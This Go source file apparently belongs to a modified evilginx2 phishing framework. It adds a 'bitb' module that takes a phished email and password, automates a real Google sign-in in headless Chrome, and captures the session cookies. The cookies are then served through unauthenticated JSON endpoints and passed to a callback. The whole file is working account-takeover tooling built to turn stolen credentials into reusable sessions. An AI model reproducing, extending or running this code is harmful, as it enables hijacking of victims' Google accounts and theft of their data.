package core

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/input"
	"github.com/go-rod/rod/lib/proto"
	"github.com/kgretzky/evilginx2/log"
)

type BitbStatus string

const (
	BitbStatusIdle       BitbStatus = "idle"
	BitbStatusLoggingIn  BitbStatus = "logging_in"
	BitbStatusComplete   BitbStatus = "complete"
	BitbStatusFailed     BitbStatus = "failed"
)

type BitbCookie struct {
	Name     string `json:"name"`
	Value    string `json:"value"`
	Domain   string `json:"domain"`
	Path     string `json:"path"`
	Secure   bool   `json:"secure"`
	HttpOnly bool   `json:"httpOnly"`
}

type BitbSession struct {
	SessionId   string
	Email       string
	Password    string
	Status      BitbStatus
	Cookies     []BitbCookie
	CreatedAt   time.Time
	CompletedAt time.Time
	Error       string
	mu          sync.Mutex
}

type BitbManager struct {
	googleBypass *GoogleBypass
	sessions     map[string]*BitbSession
	mu           sync.Mutex
}

func NewBitbManager(gb *GoogleBypass) *BitbManager {
	return &BitbManager{
		googleBypass: gb,
		sessions:     make(map[string]*BitbSession),
	}
}

var globalBitbCookieCallback func(sessionId string, cookies []BitbCookie)

func RegisterBitbCookieCallback(fn func(sessionId string, cookies []BitbCookie)) {
	globalBitbCookieCallback = fn
}

func (bm *BitbManager) StartLogin(sessionId string, email string, password string) {
	bm.mu.Lock()
	if _, exists := bm.sessions[sessionId]; exists {
		bm.mu.Unlock()
		return
	}
	bs := &BitbSession{
		SessionId: sessionId,
		Email:     email,
		Password:  password,
		Status:    BitbStatusIdle,
		CreatedAt: time.Now(),
	}
	bm.sessions[sessionId] = bs
	bm.mu.Unlock()

	go bm.performLogin(bs)
}

func (bm *BitbManager) performLogin(bs *BitbSession) {
	bs.mu.Lock()
	bs.Status = BitbStatusLoggingIn
	bs.mu.Unlock()

	log.Info("bitb: starting Chrome login for session %s (%s)", bs.SessionId, bs.Email)

	cookies, err := bm.loginWithChrome(bs.Email, bs.Password)

	bs.mu.Lock()
	defer bs.mu.Unlock()

	if err != nil {
		bs.Status = BitbStatusFailed
		bs.Error = err.Error()
		log.Error("bitb: login failed for session %s: %v", bs.SessionId, err)
		return
	}

	bs.Cookies = cookies
	bs.Status = BitbStatusComplete
	bs.CompletedAt = time.Now()
	log.Info("bitb: login successful for session %s - captured %d cookies", bs.SessionId, len(cookies))

	if globalBitbCookieCallback != nil {
		globalBitbCookieCallback(bs.SessionId, cookies)
	}
}

func (bm *BitbManager) loginWithChrome(email string, password string) ([]BitbCookie, error) {
	if bm.googleBypass == nil || !bm.googleBypass.running {
		return nil, fmt.Errorf("chrome not available - start evilginx with --google-bypass")
	}

	bm.mu.Lock()
	browser := bm.googleBypass.browser
	bm.mu.Unlock()

	if browser == nil {
		return nil, fmt.Errorf("browser not initialized")
	}

	page, err := browser.Page(proto.TargetCreateTarget{URL: "about:blank"})
	if err != nil {
		return nil, fmt.Errorf("failed to create page: %v", err)
	}
	defer page.Close()

	if err := page.SetViewport(&proto.EmulationSetDeviceMetricsOverride{
		Width:              1920,
		Height:             1080,
		DeviceScaleFactor:  1,
		Mobile:             false,
	}); err != nil {
		return nil, fmt.Errorf("failed to set viewport: %v", err)
	}

	log.Debug("bitb: navigating to accounts.google.com")
	if err := page.Navigate("https://accounts.google.com/"); err != nil {
		return nil, fmt.Errorf("navigate failed: %v", err)
	}
	page.MustWaitLoad()

	waitForElement := func(selector string, timeout time.Duration) error {
		deadline := time.Now().Add(timeout)
		for time.Now().Before(deadline) {
			el, err := page.Element(selector)
			if err == nil && el != nil {
				visible, _ := el.Visible()
				if visible {
					return nil
				}
			}
			time.Sleep(300 * time.Millisecond)
		}
		return fmt.Errorf("element not found within timeout: %s", selector)
	}

	if err := waitForElement("#identifierId", 15*time.Second); err != nil {
		return nil, fmt.Errorf("email field not found: %v", err)
	}

	el, err := page.Element("#identifierId")
	if err != nil {
		return nil, fmt.Errorf("email element error: %v", err)
	}

	if err := el.Input(email); err != nil {
		return nil, fmt.Errorf("email input failed: %v", err)
	}
	time.Sleep(500 * time.Millisecond)

	if err := page.Keyboard.Press(input.Enter); err != nil {
		return nil, fmt.Errorf("enter key failed: %v", err)
	}

	if err := waitForElement("input[type=\"password\"]", 15*time.Second); err != nil {
		return nil, fmt.Errorf("password field not found: %v", err)
	}
	time.Sleep(1 * time.Second)

	pwEl, err := page.Element("input[type=\"password\"]")
	if err != nil {
		return nil, fmt.Errorf("password element error: %v", err)
	}

	if err := pwEl.Input(password); err != nil {
		return nil, fmt.Errorf("password input failed: %v", err)
	}
	time.Sleep(500 * time.Millisecond)

	if err := page.Keyboard.Press(input.Enter); err != nil {
		return nil, fmt.Errorf("enter key failed: %v", err)
	}

	time.Sleep(5 * time.Second)

	for i := 0; i < 20; i++ {
		page.MustWaitLoad()
		time.Sleep(1 * time.Second)

		currentUrl, err := page.Eval("window.location.href")
		if err == nil {
			urlStr := currentUrl.Value.String()
			log.Debug("bitb: current URL: %s", urlStr)

			if strings.Contains(urlStr, "myaccount.google.com") ||
				strings.Contains(urlStr, "mail.google.com") ||
				strings.Contains(urlStr, "accounts.google.com/signin/v2/challenge") {
				break
			}
		}

		cookieReady := false
		if i > 3 {
			if strings.Contains(page.MustEval("document.body ? document.body.innerText.substring(0,100) : ''").String(), "sign in") {
			} else {
				cookieReady = true
			}
		}
		if cookieReady {
			break
		}
	}

	time.Sleep(2 * time.Second)

	cookies, err := bm.extractCookies(page)
	if err != nil {
		return nil, fmt.Errorf("cookie extraction failed: %v", err)
	}

	return cookies, nil
}

func (bm *BitbManager) extractCookies(page *rod.Page) ([]BitbCookie, error) {
	cdpCookies, err := page.Cookies(nil)
	if err != nil {
		cdpResult, err2 := proto.NetworkGetCookies{}.Call(page)
		if err2 != nil {
			return nil, fmt.Errorf("failed to get cookies: %v / %v", err, err2)
		}
		cdpCookies = cdpResult
	}

	var cookies []BitbCookie
	seen := make(map[string]bool)
	for _, c := range cdpCookies {
		key := c.Name + "=" + c.Value
		if seen[key] {
			continue
		}
		seen[key] = true

		cookies = append(cookies, BitbCookie{
			Name:     c.Name,
			Value:    c.Value,
			Domain:   c.Domain,
			Path:     c.Path,
			Secure:   c.Secure,
			HttpOnly: c.HttpOnly,
		})
	}

	return cookies, nil
}

func (bm *BitbManager) GetStatus(sessionId string) (string, int, error) {
	bm.mu.Lock()
	defer bm.mu.Unlock()

	bs, ok := bm.sessions[sessionId]
	if !ok {
		return "", 0, fmt.Errorf("session not found")
	}
	bs.mu.Lock()
	defer bs.mu.Unlock()
	return string(bs.Status), len(bs.Cookies), nil
}

func (bm *BitbManager) GetCookies(sessionId string) ([]BitbCookie, error) {
	bm.mu.Lock()
	defer bm.mu.Unlock()

	bs, ok := bm.sessions[sessionId]
	if !ok {
		return nil, fmt.Errorf("session not found")
	}
	bs.mu.Lock()
	defer bs.mu.Unlock()

	if bs.Status != BitbStatusComplete {
		return nil, fmt.Errorf("login not complete yet - status: %s", bs.Status)
	}

	result := make([]BitbCookie, len(bs.Cookies))
	copy(result, bs.Cookies)
	return result, nil
}

func (bm *BitbManager) HandleStatusRequest(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/bitb/"), "/")
	if len(parts) < 2 {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid path"})
		return
	}
	sessionId := parts[1]

	bm.mu.Lock()
	bs, ok := bm.sessions[sessionId]
	bm.mu.Unlock()

	if !ok {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "session not found"})
		return
	}

	bs.mu.Lock()
	resp := map[string]interface{}{
		"session_id": bs.SessionId,
		"email":      bs.Email,
		"status":     bs.Status,
		"created_at": bs.CreatedAt.Unix(),
	}
	if bs.Status == BitbStatusComplete {
		resp["completed_at"] = bs.CompletedAt.Unix()
		resp["cookie_count"] = len(bs.Cookies)
	}
	if bs.Status == BitbStatusFailed {
		resp["error"] = bs.Error
	}
	bs.mu.Unlock()

	writeJSON(w, http.StatusOK, resp)
}

func (bm *BitbManager) HandleCookiesRequest(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/bitb/"), "/")
	if len(parts) < 2 {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid path"})
		return
	}
	sessionId := parts[1]

	cookies, err := bm.GetCookies(sessionId)
	if err != nil {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": err.Error()})
		return
	}

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"session_id": sessionId,
		"cookies":    cookies,
		"count":      len(cookies),
	})
}

func writeJSON(w http.ResponseWriter, status int, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(v)
}

func (p *HttpProxy) handleBitbRequest(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")

	if r.Method == "OPTIONS" {
		w.WriteHeader(http.StatusOK)
		return
	}

	path := strings.TrimPrefix(r.URL.Path, "/bitb/")
	parts := strings.Split(path, "/")

	if len(parts) < 1 {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid path"})
		return
	}

	if parts[0] == "status" && len(parts) >= 2 {
		if p.bitbManager != nil {
			p.bitbManager.HandleStatusRequest(w, r)
		} else {
			writeJSON(w, http.StatusServiceUnavailable, map[string]string{"error": "bitb not available"})
		}
		return
	}

	if parts[0] == "cookies" && len(parts) >= 2 {
		if p.bitbManager != nil {
			p.bitbManager.HandleCookiesRequest(w, r)
		} else {
			writeJSON(w, http.StatusServiceUnavailable, map[string]string{"error": "bitb not available"})
		}
		return
	}

	writeJSON(w, http.StatusNotFound, map[string]string{"error": "not found"})
}
